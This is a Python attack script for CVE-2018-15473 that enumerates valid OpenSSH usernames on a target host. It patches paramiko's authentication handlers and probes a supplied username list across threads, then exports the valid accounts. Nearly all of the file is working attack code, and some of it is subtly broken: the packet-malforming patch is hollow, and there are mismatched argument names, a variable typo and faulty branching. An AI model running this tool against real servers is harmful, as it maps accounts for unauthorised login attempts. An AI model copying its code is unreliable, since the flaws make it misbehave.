# pylint: disable=C0103,C0301,W1401,C0115

"""
    ###!-------------------------- Username Enumeration / ĞŸĞµÑ€ĞµÑ‡Ğ¸ÑĞ»ĞµĞ½Ğ¸Ğµ Ğ¸Ğ¼ĞµĞ½ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ĞµĞ¹ --------------------------###
    ###!-------------------------------------- / EnumeraciÃ³n de usuario --------------------------------------------###
"""

import argparse
import socket
import concurrent.futures
import json
import logging
import signal  #! ğ—”ğ—´ğ—¿ğ—²ğ—´ğ—®ğ—¿ ğ—¹ğ—® ğ—¶ğ—ºğ—½ğ—¼ğ—¿ğ˜ğ—®ğ—°ğ—¶ğ—¼ğ—» ğ—±ğ—² ğ—¹ğ—® ğ—¯ğ—¶ğ—¯ğ—¹ğ—¶ğ—¼ğ˜ğ—²ğ—°ğ—® ğ—±ğ—² ğ˜€ğ—¶ğ—´ğ—»ğ—®ğ—¹
import sys
import paramiko
from colorama import Fore, Style

#!-------------- Colors / Ğ¦Ğ²ĞµÑ‚Ğ° --------------#
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
BLUE = Fore.BLUE
WHITE = Fore.WHITE
CYAN = Fore.CYAN
RED = Fore.RED
MAGENTA = Fore.MAGENTA
END_COLOR = Style.RESET_ALL
BRIGHT = Style.BRIGHT
#!----------------- '' / '' ------------------#

class InvalidUsername(Exception):
    def __init__(self):
        pass

# Bandera para rastrear si se ha presionado Ctrl+C
ctrl_c_pressed = False

# FunciÃ³n para manejar la seÃ±al Ctrl+C
def signal_handler(sig, frame):
    global ctrl_c_pressed
    if not ctrl_c_pressed:
        ctrl_c_pressed = True
        print(f"\n{BRIGHT}{MAGENTA}Ctrl+C detectado. Saliendo...{END_COLOR}")
        sys.exit(1)

# Registra el manejador de seÃ±ales para Ctrl+C
signal.signal(signal.SIGINT, signal_handler)

# FunciÃ³n que se sobrescribirÃ¡ para deformar el paquete
OLD_SERVICE_ACCEPT = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# malicious function to malform packet
def add_boolean(*args, **kwargs):
    """Lo pasa :)"""

# llamar cuando el nombre de usuario no era vÃ¡lido
def call_error(*args, **kwargs):
    """InvalidUsername"""
    raise InvalidUsername

# Malicious function to overwrite MSG_SERVICE_ACCEPT handler
def packet_malformado(*args, **kwargs):
    """Sobre escribir el controlador"""
    old_add_boolean = paramiko.message.Message.add_boolean
    result = OLD_SERVICE_ACCEPT(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

# asignar funciones a los controladores respectivos
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] =  packet_malformado
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

# realizar autenticaciÃ³n con paquetes y nombres de usuario maliciosos
def check_username(username, hostname, port):
    """Chequeamos"""
    sock = socket.socket()
    try:
        sock.connect((hostname, int(port)))
    except socket.error:
        print(f"{BRIGHT}{RED}[-] Error al conectar con el host {hostname}:{port}. Verifica la direcciÃ³n y el puerto.{END_COLOR}")
        return None

    # Crear una instancia de transporte
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client(timeout=0.5)
    except paramiko.ssh_exception.SSHException:
        # Es posible que el servidor SSH estÃ© ocupado o configurado para ocultar informaciÃ³n
        # de autenticaciÃ³n fallida. Retry un mÃ¡ximo de 3 veces.
        transport.close()
        for _ in range(3):
            try:
                sock = socket.socket()
                sock.connect((hostname, port))
                transport = paramiko.transport.Transport(sock)
                transport.start_client()
                break
            except paramiko.ssh_exception.SSHException:
                transport.close()
        else:
            print(f'{BRIGHT}{CYAN}[-] No se pudo negociar el transporte SSH.{END_COLOR}')
            return None

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
        print(f"{BRIGHT}{GREEN}[+] {username} es un usuario vÃ¡lido{END_COLOR}".format(username))
        return True

    except paramiko.ssh_exception.AuthenticationException:
        print(f"{BRIGHT}{RED}[-] {username} no es un usuario vÃ¡lido{END_COLOR}".format(username))
        return False

    except paramiko.ssh_exception.SSHException as e:
        print(f"{BRIGHT}{WHITE}[-] Error en la autenticaciÃ³n de {username}: {e}{END_COLOR}")
        return None       

# Realizar la exportaciÃ³n de los resultado
def process_results(results, output_file, output_format):
    """ğ——ğ—²ğ—³ğ—¶ğ—»ğ—¶ğ—ºğ—¼ğ˜€ ğ—¹ğ—®ğ˜€ ğ—¼ğ—½ğ—°ğ—¶ğ—¼ğ—»ğ—²ğ˜€ ğ—±ğ—² 'ğ—¼ğ˜‚ğ˜ğ—½ğ˜‚ğ˜ğ—™ğ—¶ğ—¹ğ—²' ğ˜† 'ğ—¼ğ˜‚ğ˜ğ—½ğ˜‚ğ˜ğ—™ğ—¼ğ—¿ğ—ºğ—®ğ˜' ğ—½ğ—®ğ—¿ğ—® ğ—¹ğ—¼ğ˜€ ğ—³ğ—¼ğ—¿ğ—ºğ—®ğ˜ğ—¼ğ˜€ 'ğ—¹ğ—¶ğ˜€ğ˜', 'ğ—·ğ˜€ğ—¼ğ—»', 'ğ—°ğ˜€ğ˜ƒ'"""
    if output_format == 'list':
        with open(output_file, 'w', encoding="utf-8") as file:
            for username, valid in results:
                if valid:
                    file.write(f"{username} is a valid user! / Ğ´ĞµĞ¹ÑÑ‚Ğ²Ğ¸Ñ‚ĞµĞ»ÑŒĞ½Ñ‹Ğ¹ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ÑŒ!\n")
                else:
                    file.write(f"{username} is not a valid user! / Ğ½ĞµĞ´ĞµĞ¹ÑÑ‚Ğ²Ğ¸Ñ‚ĞµĞ»ÑŒĞ½Ñ‹Ğ¼ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ĞµĞ¼!\n")

    elif output_format == 'json':
        data = {"Valid": [], "Invalid": []}
        for unsername, valid in results:
            if valid:
                data['Valid'].append(username)
            else:
                data['Invalid'].append(unsername)
        with open(output_file, 'w', encoding="utf-8") as file:
            json.dump(data, file)

    elif output_format == 'csv':
        with open(output_file, 'w', encoding="utf-8") as file:
            file.write("Username, Valid\n")
            for username, valid in results:
                file.write(f"{username}, {valid}\n")

    else:
        for username, valid in results:
            if valid:
                print(f"{BRIGHT}{GREEN}{username} is a valid user!{END_COLOR}")
            else:
                print(f"{BRIGHT}{RED}{username} is not a valid user!{END_COLOR}")

#ANCHOR deshacerse del registro de paramiko
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

#!----------------Las opciones------------------!#
def Banner():
    """CVE-2018-15473"""
    print(f"""
        {BRIGHT}# Exploit: OpenSSH 7.7 - Username Enumeration{END_COLOR}
        {BRIGHT}# Modified by: {BLUE}mrblue12-byte{END_COLOR}
        {BRIGHT}# Date: 2018-08-20, 2023-09-14{END_COLOR}
        {BRIGHT}# Affected Versions: OpenSSH version < 7.7{END_COLOR}
        {BRIGHT}# CVE: CVE-2018-15473{END_COLOR}
            {BRIGHT}##########################################################################{END_COLOR}
            {BRIGHT}#                                                                        #{END_COLOR}
            {BRIGHT}#    _|_|                                    _|_|_|    _|_|_|  _|    _|  #{END_COLOR}
            {BRIGHT}#  _|    _|  _|_|_|      _|_|    _|_|_|    _|        _|        _|    _|  #{END_COLOR}
            {BRIGHT}#  _|    _|  _|    _|  _|_|_|_|  _|    _|    _|_|      _|_|    _|_|_|_|  #{END_COLOR}
            {BRIGHT}#  _|    _|  _|    _|  _|        _|    _|        _|        _|  _|    _|  #{END_COLOR}
            {BRIGHT}#    _|_|    _|_|_|      _|_|_|  _|    _|  _|_|_|    _|_|_|    _|    _|  #{END_COLOR}
            {BRIGHT}#            _|                                    Username Enumeration  #{END_COLOR}
            {BRIGHT}#            _|			                                     #{END_COLOR}
            {BRIGHT}##########################################################################{END_COLOR}
        """)

def main():
    """define 7 options / ĞœÑ‹ Ğ¾Ğ¿Ñ€ĞµĞ´ĞµĞ»ÑĞµĞ¼ 7 Ğ²Ğ°Ñ€Ğ¸Ğ°Ğ½Ñ‚Ğ¾Ğ² / Definimos 7 opciones"""
    Banner()
    arg_parser = argparse.ArgumentParser(description="SSH Username Enumeration / ĞŸĞµÑ€ĞµÑ‡Ğ¸ÑĞ»ĞµĞ½Ğ¸Ğµ Ğ¸Ğ¼ĞµĞ½Ğ¸ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»Ñ SSH / EnumeraciÃ³n de nombre de usuario SSH")
    arg_parser.add_argument('hostname', type=str, help="The target hostname or ip address")
    arg_parser.add_argument('--port', type=int, default=22, help="The target port")
    arg_parser.add_argument('--threads', type=int, default=5, help="The number of threads to be used")
    arg_parser.add_argument('--outputFile', type=str, help="The output file location")
    arg_parser.add_argument('--outputFormat', choices=['list', 'json', 'csv'], default='list', type=str, help="The output file location")
    group = arg_parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--username', type=str, help="The single username to validate")
    group.add_argument('--userList', type=str, help="The list of usernames (one per line) to enumerate through")
    args = arg_parser.parse_args()

    if args.username:
        result = check_username(args.username, args.hostname, args.port)
        if result is not None:
            results = [(args.username, result)]
        else:
            results = []

    if args.userList:
        try:
            with open(args.userList, 'r', encoding="utf-8") as Reading_File:
                usernames = [line.strip() for line in Reading_File.readlines()]
        except IOError:
            print(f"{BRIGHT}{YELLOW}Error: No se pudo abrir el archivo de lista de usuarios.{END_COLOR}")
            return

        # FunciÃ³n para manejar Ctrl+C
        def handle_ctrl_c(signum, frame):
            global ctrl_c_pressed
            ctrl_c_pressed = True
            print(f"\n{BRIGHT}{MAGENTA}Ctrl+C detectado. Saliendo...{END_COLOR}")
            sys.exit(1)

        # Registra el manejador de seÃ±ales para Ctrl+C
        signal.signal(signal.SIGINT, handle_ctrl_c)

        # Verifica si se ha presionado Ctrl+C antes de comenzar a enumerar usuarios
        if ctrl_c_pressed:
            print(f"{BRIGHT}{WHITE}InterrupciÃ³n de Ctrl+C detectada. Saliendo...{END_COLOR}")
            return
        
        results = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            future_to_username = {executor.submit(check_username, username, args.hostname, args.port): username for username in usernames}
            for future in concurrent.futures.as_completed(future_to_username):
                if ctrl_c_pressed:
                    break
                username = future_to_username[future]
                try:
                    result = future.result()
                    if result is not None:
                        results.append((username, result))
                except InvalidUsername:
                    results.append((username, False))

    else:
        print(f"{BRIGHT}{CYAN}Error: Debes proporcionar al menos un nombre de usuario o una lista de usuarios.{END_COLOR}")
        return

    if args.outputFile:
        process_results(results, args.output_file, args.output_format)
        #! ğ—œğ—ºğ—½ğ—¿ğ—¶ğ—ºğ—² ğ—¹ğ—¼ğ˜€ ğ—¿ğ—²ğ˜€ğ˜‚ğ—¹ğ˜ğ—®ğ—±ğ—¼ğ˜€ ğ—²ğ—» ğ—¹ğ—® ğ—°ğ—¼ğ—»ğ˜€ğ—¼ğ—¹ğ—® ğ˜€ğ—¶ ğ—»ğ—¼ ğ˜€ğ—² ğ—²ğ˜€ğ—½ğ—²ğ—°ğ—¶ğ—³ğ—¶ğ—°ğ—® ğ˜‚ğ—» ğ—®ğ—¿ğ—°ğ—µğ—¶ğ˜ƒğ—¼ ğ—±ğ—² ğ˜€ğ—®ğ—¹ğ—¶ğ—±ğ—®
        process_results(results, None, args.outputFormat)

if __name__=='__main__':
    main()
